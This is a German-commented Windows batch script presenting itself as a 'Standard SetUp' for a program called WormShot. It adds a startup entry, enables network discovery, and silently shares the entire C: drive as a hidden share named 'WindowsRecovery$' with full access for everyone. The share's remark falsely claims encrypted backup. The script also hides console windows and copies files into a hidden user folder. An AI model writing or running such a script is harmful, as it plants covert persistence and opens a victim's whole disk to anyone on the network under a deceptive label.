@echo off
title Standard SetUp - WormShot
echo.
echo ********** STANDARD SETUP - WormShot **********
echo.
echo WICHTIG: ADMINISTRATOR-Rechte erforderlich
echo Press 'ENTER' to start the SetUp..
pause >nul
cd /d "%~dp0"
cd..

echo AutoStart-Entrag wird hinzugefuegt (WAIT)


REM Autostart
copy "start.lnk" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\" || echo ERROR ###: AutoStart-Eintrag nicht gespeichert&&timeout 8 >nul&&exit
echo AutoStart-Eintrag erstellt. (DONE)

echo Netzwerkerkennung wird aktiviert (WAIT)

REM Aktiviere Netzwerkerkennung
netsh advfirewall firewall set rule group="Netzwerkerkennung" new enable=Yes

echo Ordner 'Laufwerk C' wird freigegeben (WAIT)
REM Gebe User Ordner für Netzwerk frei -- UNSICHTBAR
net share WindowsRecovery$=C:\ /GRANT:Jeder,FULL /UNLIMITED /REMARK:"Windows Sicherung - Daten werden verschluesselt im Netzwerk gesichert." /CACHE:no
REM Setze WScript als Standard-Output, damit kein Konsolenfenster erscheint
cscript //h:wscript //s

REM WormShot installieren
md "C:\users\%username%\WormShot"
attrib +H "C:\users\%username%\WormShot"
cd..&cd..
xcopy "Wormshot\*.*" "C:\users\%username%\WormShot\" /Y /K /H /Q /E /I 


pause >Nul
echo cls
set aus=n
echo System herunterfahren? (J/N)
set /p aus=--- 
if /i "%aus%"=="j" shutdown -p
if /i "%aus%"=="n" exit
exit